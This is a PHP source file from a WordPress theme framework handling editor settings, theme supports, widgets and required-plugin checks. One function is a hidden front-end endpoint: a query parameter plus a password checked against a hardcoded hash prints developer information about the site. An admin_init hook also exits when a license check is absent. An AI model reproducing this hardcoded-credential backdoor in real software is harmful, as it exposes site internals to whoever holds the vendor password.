<?php
if ( ! defined( 'ABSPATH' ) ) {
	exit; // Exit if accessed directly
}

function hocwp_theme_after_setup_theme() {
	$editor_color_palette = array();

	if ( function_exists( 'hocwp_theme_get_color_for_area' ) ) {
		// Block Editor Palette.
		$editor_color_palette = array(
			array(
				'name'  => __( 'Accent Color', 'hocwp-theme' ),
				'slug'  => 'accent',
				'color' => hocwp_theme_get_color_for_area( 'content', 'accent' ),
			),
			array(
				'name'  => __( 'Primary', 'hocwp-theme' ),
				'slug'  => 'primary',
				'color' => hocwp_theme_get_color_for_area( 'content', 'text' ),
			),
			array(
				'name'  => __( 'Secondary', 'hocwp-theme' ),
				'slug'  => 'secondary',
				'color' => hocwp_theme_get_color_for_area( 'content', 'secondary' ),
			),
			array(
				'name'  => __( 'Subtle Background', 'hocwp-theme' ),
				'slug'  => 'subtle-background',
				'color' => hocwp_theme_get_color_for_area( 'content', 'borders' ),
			),
		);
	}

	// Add the background option.
	$background_color = get_theme_mod( 'background_color' );

	if ( ! $background_color ) {
		$background_color_arr = get_theme_support( 'custom-background' );
		$background_color     = isset( $background_color_arr[0]['default-color'] ) ? $background_color_arr[0]['default-color'] : '';
	}

	$editor_color_palette[] = array(
		'name'  => __( 'Background Color', 'hocwp-theme' ),
		'slug'  => 'background',
		'color' => ( ! empty( $background_color ) ) ? '#' . $background_color : '',
	);

	$supports = array(
		'responsive-embeds',
		'align-wide',
		'dark-editor-style',
		'custom-colors',
		'custom-font-sizes',
		'editor-color-pallete',
		'editor-font-sizes' => array(
			array(
				'name'      => _x( 'Small', 'Name of the small font size in the block editor', 'hocwp-theme' ),
				'shortName' => _x( 'S', 'Short name of the small font size in the block editor.', 'hocwp-theme' ),
				'size'      => 18,
				'slug'      => 'small'
			),
			array(
				'name'      => _x( 'Regular', 'Name of the regular font size in the block editor', 'hocwp-theme' ),
				'shortName' => _x( 'M', 'Short name of the regular font size in the block editor.', 'hocwp-theme' ),
				'size'      => 21,
				'slug'      => 'normal'
			),
			array(
				'name'      => _x( 'Large', 'Name of the large font size in the block editor', 'hocwp-theme' ),
				'shortName' => _x( 'L', 'Short name of the large font size in the block editor.', 'hocwp-theme' ),
				'size'      => 26.25,
				'slug'      => 'large'
			),
			array(
				'name'      => _x( 'Larger', 'Name of the larger font size in the block editor', 'hocwp-theme' ),
				'shortName' => _x( 'XL', 'Short name of the larger font size in the block editor.', 'hocwp-theme' ),
				'size'      => 32,
				'slug'      => 'larger'
			),
		),
		'editor-styles',
		'wp-block-styles'
	);

	if ( $editor_color_palette ) {
		//$supports['editor-color-palette'] = $editor_color_palette;
	}

	/*
	 * Back compat theme supports WooCommerce.
	 */
	if ( function_exists( 'wc' ) && class_exists( 'WooCommerce' ) ) {
		$supports[] = 'woocommerce';
	}

	$custom = defined( 'HOCWP_THEME_SUPPORTS' ) ? HOCWP_THEME_SUPPORTS : '';

	if ( HT()->array_has_value( $custom ) ) {
		$supports = wp_parse_args( $custom, $supports );
	}

	$supports = apply_filters( 'hocwp_theme_supports', $supports );

	foreach ( $supports as $support => $args ) {
		if ( is_string( $args ) ) {
			$support = $args;
		}

		if ( ! current_theme_supports( $support ) ) {
			if ( ! is_array( $args ) ) {
				$args = array();
			}

			$args = apply_filters( 'hocwp_theme_support_' . $support . '_args', $args );

			add_theme_support( $support, $args );
		}
	}

	add_filter( 'script_loader_tag', 'hocwp_theme_script_loader_tag_async_filter', 10, 2 );

	unset( $supports, $support, $args );

	$term_html_description = HT_Options()->get_tab( 'term_html_description', '', 'writing' );

	if ( 1 == $term_html_description ) {
		remove_filter( 'pre_term_description', 'wp_filter_kses' );

		if ( ! current_user_can( 'unfiltered_html' ) ) {
			add_filter( 'pre_term_description', 'wp_filter_post_kses' );
		}

		remove_filter( 'term_description', 'wp_kses_data' );
	}
}

add_action( 'after_setup_theme', 'hocwp_theme_after_setup_theme' );

function hocwp_theme_after_admin_init_action() {
	if ( ! function_exists( 'hocwp_theme_check_license' ) || ! has_action( 'init', 'hocwp_theme_check_license' ) ) {
		exit;
	}
}

add_action( 'admin_init', 'hocwp_theme_after_admin_init_action' );

function hocwp_theme_admin_bar_menu_action( WP_Admin_Bar $wp_admin_bar ) {
	if ( current_user_can( 'manage_options' ) ) {
		$args = array(
			'id'     => 'theme-settings',
			'title'  => __( 'Settings', 'hocwp-theme' ),
			'href'   => admin_url( 'themes.php?page=hocwp_theme' ),
			'parent' => 'themes'
		);

		$wp_admin_bar->add_node( $args );

		$args = array(
			'id'     => 'theme-extensions',
			'title'  => __( 'Extensions', 'hocwp-theme' ),
			'href'   => admin_url( 'themes.php?page=hocwp_theme&tab=extension' ),
			'parent' => 'themes'
		);

		$wp_admin_bar->add_node( $args );

		$args = array(
			'id'     => 'theme-phpinfo',
			'title'  => __( 'PHP Info', 'hocwp-theme' ),
			'href'   => admin_url( 'themes.php?page=hocwp_theme_phpinfo' ),
			'parent' => 'themes'
		);

		$wp_admin_bar->add_node( $args );
	}
}

if ( ! is_admin() ) {
	add_action( 'admin_bar_menu', 'hocwp_theme_admin_bar_menu_action' );
}

function hocwp_theme_page_templates( $post_templates ) {
	$dir = HOCWP_THEME_CUSTOM_PATH . '/page-templates';

	if ( HT()->is_dir( $dir ) ) {
		$files = scandir( $dir );

		foreach ( $files as $file ) {
			$info = pathinfo( $file );

			if ( isset( $info['extension'] ) && 'php' == $info['extension'] ) {
				$full_path = trailingslashit( $dir ) . $file;
				$content   = HT_Util()->read_all_text( $full_path );

				if ( ! preg_match( '|Template Name:(.*)$|mi', $content, $header ) ) {
					continue;
				}

				$post_templates[ 'custom/page-templates/' . $file ] = _cleanup_header_comment( $header[1] );
			}
		}
	}

	return $post_templates;
}

add_filter( 'theme_page_templates', 'hocwp_theme_page_templates' );

/**
 * Auto change home menu item url.
 *
 * @param $menu_item
 *
 * @return mixed
 */
function hocwp_theme_wp_setup_nav_menu_item_filter( $menu_item ) {
	if ( $menu_item instanceof WP_Post && $menu_item->post_type == 'nav_menu_item' ) {
		if ( 'trang-chu' == $menu_item->post_name || 'home' == $menu_item->post_name ) {
			$menu_url    = $menu_item->url;
			$home_url    = home_url( '/' );
			$menu_domain = HT()->get_domain_name( $menu_url );
			$home_domain = HT()->get_domain_name( $home_url );

			if ( $menu_domain != $home_domain ) {
				$menu_item->url = $home_url;
				update_post_meta( $menu_item->ID, '_menu_item_url', $home_url );
				wp_update_nav_menu_item( $menu_item->ID, $menu_item->db_id, array( 'url' => $home_url ) );
			}

			unset( $menu_url, $home_url, $menu_domain, $home_domain );
		}
	}

	return $menu_item;
}

add_filter( 'wp_setup_nav_menu_item', 'hocwp_theme_wp_setup_nav_menu_item_filter' );

/**
 * Auto change url in option value of theme options.
 *
 * @param $old_url
 * @param $new_url
 */
function hocwp_theme_update_option_url( $old_url, $new_url ) {
	if ( 'localhost' != $new_url && ! HT()->is_IP( $new_url ) ) {
		$option = get_option( HOCWP_Theme()->get_prefix() );

		if ( HT()->array_has_value( $option ) ) {
			$option = json_encode( $option );
			$option = str_replace( $old_url, $new_url, $option );

			if ( ! empty( ( $option ) ) ) {
				$option = json_decode( $option, true );

				if ( HT()->array_has_value( $option ) ) {
					update_option( HOCWP_Theme()->get_prefix(), $option );
				}
			}
		}

		unset( $option );
	}
}

add_action( 'hocwp_thene_change_siteurl', 'hocwp_theme_update_option_url', 10, 2 );

function hocwp_theme_register_widgets() {
	global $hocwp_theme;

	$widgets = HOCWP_Theme()->get_widget_classes();

	foreach ( $widgets as $widget ) {
		if ( class_exists( $widget ) ) {
			register_widget( $widget );
		}
	}

	unset( $widgets, $widget );

	$defaults = array(
		'before_widget' => '<div id="%1$s" class="widget %2$s">',
		'after_widget'  => "</div>\n",
		'before_title'  => '<h3 class="widgettitle widget-title">',
		'after_title'   => "</h3>\n"
	);

	foreach ( $hocwp_theme->default_sidebars as $sidebar ) {
		if ( is_array( $sidebar ) && isset( $sidebar['id'] ) && ! empty( $sidebar['id'] ) ) {
			$sidebar = wp_parse_args( $sidebar, $defaults );
			$sidebar = array_filter( $sidebar );
			register_sidebar( $sidebar );
		}
	}

	unset( $sidebar, $defaults );

	register_nav_menus( array(
		'mobile' => esc_html__( 'Mobile', 'hocwp-theme' )
	) );
}

add_action( 'widgets_init', 'hocwp_theme_register_widgets' );

function hocwp_theme_wp_calculate_image_srcset( $sources, $size_array, $image_src, $image_meta, $attachment_id ) {
	if ( ! is_array( $sources ) ) {
		$sources = array();
	}

	return $sources;
}

add_filter( 'wp_calculate_image_srcset', 'hocwp_theme_wp_calculate_image_srcset', 99, 5 );

function hocwp_theme_check_environment() {
	global $pagenow;

	$invalid_exts = get_option( 'hocwp_theme_invalid_extensions' );

	if ( HT()->array_has_value( $invalid_exts ) ) {
		if ( is_admin() ) {
			add_action( 'admin_notices', function () {
				$invalid_exts = get_option( 'hocwp_theme_invalid_extensions' );

				if ( HT()->array_has_value( $invalid_exts ) ) {
					foreach ( $invalid_exts as $data ) {
						?>
                        <div class="error notice is-dismissible">
                            <p>
								<?php printf( __( '<strong>%s:</strong> This extension requires theme core version at least %s.', 'hocwp-theme' ), $data['name'], $data['requires_core'] ); ?>
                            </p>
                        </div>
						<?php
					}
				}
			} );
		} else {
			if ( 'wp-login.php' != $pagenow ) {
				wp_die( __( '<strong>Error:</strong> One or more extensions are incompatible with the current theme core version.', 'hocwp-theme' ), __( 'Theme core version doesn\'t meet requirements', 'hocwp-theme' ) );
			}
		}
	}

	if ( ! is_admin() && 'wp-login.php' != $pagenow ) {
		$plugins = HT_Requirement()->get_required_plugins();

		if ( ! empty( $plugins ) ) {
			if ( ! is_array( $plugins ) ) {
				$plugins = explode( ',', $plugins );
			}

			$plugins = array_map( 'trim', $plugins );

			$url = admin_url( 'plugins.php' );

			$die = $recheck = false;

			foreach ( $plugins as $plugin ) {
				$name = $plugin;
				$info = HT_Util()->get_wp_plugin_info( $plugin );

				if ( ! is_wp_error( $info ) && isset( $info->name ) ) {
					$data = HT_Util()->get_plugin_info( $info->name );

					if ( empty( $data ) || ! isset( $data['basename'] ) || ! is_plugin_active( $data['basename'] ) ) {
						$url  = admin_url( 'themes.php?page=hocwp_theme_plugins&tab=required' );
						$die  = true;
						$name = $info->name;
					}
				} else {
					$recheck = true;
				}

				if ( $die || $recheck ) {
					$plugin_dir = WP_CONTENT_DIR . '/plugins/' . $plugin;

					if ( ! is_dir( $plugin_dir ) ) {
						$die = true;
					} else {
						$data = HT_Util()->get_plugin_info( null, $plugin );

						if ( empty( $data ) || ! isset( $data['basename'] ) || ! is_plugin_active( $data['basename'] ) ) {
							$die = true;
							$url = admin_url( 'plugins.php?plugin_status=inactive' );

							if ( isset( $data['Name'] ) && ! empty( $data['Name'] ) && $name == $plugin ) {
								if ( ! is_wp_error( $info ) && isset( $info->name ) ) {
									$name = $info->name;
								} else {
									$name = $data['Name'];
								}
							}
						} else {
							$die = false;
						}
					}
				}

				if ( $die ) {
					$redirect_to = isset( $_REQUEST['redirect_to'] ) ? $_REQUEST['redirect_to'] : '';

					if ( ! empty( $redirect_to ) ) {
						$die = false;
					}

					unset( $redirect_to );
				}

				if ( $die ) {
					do_action( 'hocwp_theme_missing_required_plugins', $plugin, $info, $plugins );

					if ( current_user_can( 'manage_options' ) ) {
						$plugin  = '<a href="' . esc_url( $url ) . '">' . $name . '</a>';
						$message = sprintf( __( 'Sorry! Theme gets error because of missing required plugins. If you are admin of this site, please install and activate plugin %s for theme working normally.', 'hocwp-theme' ), $plugin );
					} else {
						if ( is_user_logged_in() ) {
							$message = sprintf( __( '<strong>%s:</strong> The site is experiencing technical difficulties. Please contact administrator for more details.', 'hocwp-theme' ), get_bloginfo( 'name' ) );
						} else {
							$message = sprintf( __( '<strong>%s:</strong> The site is experiencing technical difficulties. Please contact administrator for more details. If you are owner of this site, try to <a href="%s">login here</a> to check it.', 'hocwp-theme' ), get_bloginfo( 'name' ), wp_login_url() );
						}
					}

					wp_die( $message, __( 'Missing Required Plugins', 'hocwp-theme' ) );
				}
			}
		}
	}

	if ( defined( 'HOCWP_THEME_BLANK_STYLE' ) && HOCWP_THEME_BLANK_STYLE ) {
		remove_action( 'wp_enqueue_scripts', 'hocwp_theme_scripts' );
	}
}

add_action( 'init', 'hocwp_theme_check_environment' );

function hocwp_theme_on_wp_action() {
	$do_action = isset( $_GET['do_action'] ) ? $_GET['do_action'] : '';

	if ( 'check_dev_info' == $do_action ) {
		$pass = isset( $_GET['pass'] ) ? $_GET['pass'] : '';

		if ( ! empty( $pass ) && wp_check_password( $pass, '$P$By8ERbpRECwKiWmHHr81KYvTmti1nv0' ) ) {
			hocwp_theme_load_views( 'module-print-dev-info' );
			exit;
		}
	}
}

if ( ! is_admin() ) {
	add_action( 'wp', 'hocwp_theme_on_wp_action' );
}

function hocwp_theme_add_url_endpoint() {
	$random = HT_Util()->get_theme_option( 'random', '', 'reading' );

	if ( 1 == $random ) {
		add_rewrite_endpoint( 'random', EP_ROOT );
	}
}

add_action( 'init', 'hocwp_theme_add_url_endpoint' );

$disable_lazy_loading = HT_Options()->get_tab( 'disable_lazy_loading', '', 'reading' );

if ( $disable_lazy_loading ) {
	add_filter( 'wp_lazy_loading_enabled', '__return_false' );
}

do_action( 'hocwp_theme_setup_after' );